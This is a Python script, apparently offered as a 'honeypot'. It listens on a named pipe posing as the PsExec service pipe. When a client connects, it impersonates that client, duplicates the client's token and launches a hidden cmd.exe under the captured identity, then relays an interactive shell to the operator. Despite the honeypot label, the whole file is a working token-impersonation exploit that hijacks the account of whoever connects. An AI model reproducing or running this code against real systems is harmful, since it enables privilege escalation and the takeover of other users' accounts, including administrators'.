import win32pipe
import win32file
import win32api
import win32security
import win32process
import win32event
import sys
import threading
import time

def pipe_reader(h_pipe):
    """Reads output from the CMD process and prints it to our console."""
    try:
        while True:
            res, data = win32file.ReadFile(h_pipe, 4096)
            if data:
                print(data.decode(errors='replace'), end='', flush=True)
    except:
        pass # Pipe closed

def start_honeypot():
    pipe_path = r"\\.\pipe\PSEXESVC"
    
    server_pipe = win32pipe.CreateNamedPipe(
        pipe_path,
        win32pipe.PIPE_ACCESS_DUPLEX,
        win32pipe.PIPE_TYPE_BYTE | win32pipe.PIPE_WAIT,
        1, 65536, 65536, 0, None
    )

    print(f"[*] Honeypot Listening on {pipe_path}...")
    win32pipe.ConnectNamedPipe(server_pipe, None)
    
    try:
        # 1. Impersonate the client
        win32security.ImpersonateNamedPipeClient(server_pipe)
        
        # 2. Get the token and duplicate it
        h_token = win32security.OpenThreadToken(win32api.GetCurrentThread(), win32security.TOKEN_ALL_ACCESS, True)
        
        user_name, domain, type = win32security.LookupAccountSid(None, win32security.GetTokenInformation(h_token, win32security.TokenUser)[0])
        print(f"[+] SUCCESS! Captured: {domain}\\{user_name}")

        h_prim_token = win32security.DuplicateTokenEx(
            h_token, 
            win32security.SecurityImpersonation, 
            win32security.TOKEN_ALL_ACCESS, 
            win32security.TokenPrimary
        )

        # 3. Create Anonymous Pipes for I/O
        sa = win32security.SECURITY_ATTRIBUTES()
        sa.bInheritHandle = True 
        h_read_out, h_write_out = win32pipe.CreatePipe(sa, 0)
        h_read_in, h_write_in = win32pipe.CreatePipe(sa, 0)
        
        # Don't let our side be inherited
        win32api.SetHandleInformation(h_read_out, 1, 0)
        win32api.SetHandleInformation(h_write_in, 1, 0)

        # 4. Configure Startup Info with Window Station access
        si = win32process.STARTUPINFO()
        si.dwFlags = win32process.STARTF_USESTDHANDLES | win32process.STARTF_USESHOWWINDOW
        si.hStdInput = h_read_in
        si.hStdOutput = h_write_out
        si.hStdError = h_write_out
        si.wShowWindow = 0 
        si.lpDesktop = "WinSta0\\Default" # CRITICAL: Forces access to the window station

        # 5. Spawn CMD in a safe directory
        h_process, h_thread, dw_pid, dw_tid = win32process.CreateProcessAsUser(
            h_prim_token, 
            None, 
            "C:\\Windows\\System32\\cmd.exe", 
            None, 
            None, 
            True, 
            win32process.CREATE_NEW_CONSOLE, 
            None, 
            "C:\\Windows\\System32", # Safe working directory
            si
        )

        # 6. Start the reader thread
        t = threading.Thread(target=pipe_reader, args=(h_read_out,), daemon=True)
        t.start()

        print(f"[+] Shell active (PID: {dw_pid}). Type a command and press Enter:")
        print("-" * 50)

        # 7. Interactive Loop
        while True:
            # Check if CMD is still alive
            if win32event.WaitForSingleObject(h_process, 0) != win32event.WAIT_TIMEOUT:
                print("\n[*] Remote shell exited.")
                break

            # Use sys.stdin.readline to capture input properly in PowerShell
            line = sys.stdin.readline()
            if not line:
                break
            
            if line.strip().lower() == 'exit':
                win32process.TerminateProcess(h_process, 0)
                break
            
            # Write to CMD
            win32file.WriteFile(h_write_in, line.encode())

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        win32file.CloseHandle(server_pipe)
        print("[*] Honeypot closed.")

if __name__ == "__main__":
    start_honeypot()